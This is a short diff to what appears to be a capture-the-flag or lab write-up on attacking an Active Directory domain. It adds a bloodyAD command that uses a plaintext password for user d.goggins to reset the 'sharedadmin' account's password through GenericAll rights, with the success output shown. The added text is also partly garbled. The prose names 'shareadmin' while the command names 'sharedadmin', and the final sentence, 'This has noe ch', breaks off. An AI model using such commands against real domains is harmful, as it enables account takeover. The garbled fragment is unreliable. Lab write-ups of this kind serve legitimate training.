@@ -613,6 +613,9 @@ bloodyAD --host dc01.fragments.local -d fragments.local -u d.goggins -p 'HiO5n44
 Now the user is in the account i will have GenericAll over the `shareadmin`
 
 ```python
-
+bloodyAD --host dc01.fragments.local -d fragments.local -u d.goggins -p 'HiO5n449W36!' set password 'sharedadmin' 'Password123!'
+[+] Password changed successfully!
 ```
+
+This has noe ch
 
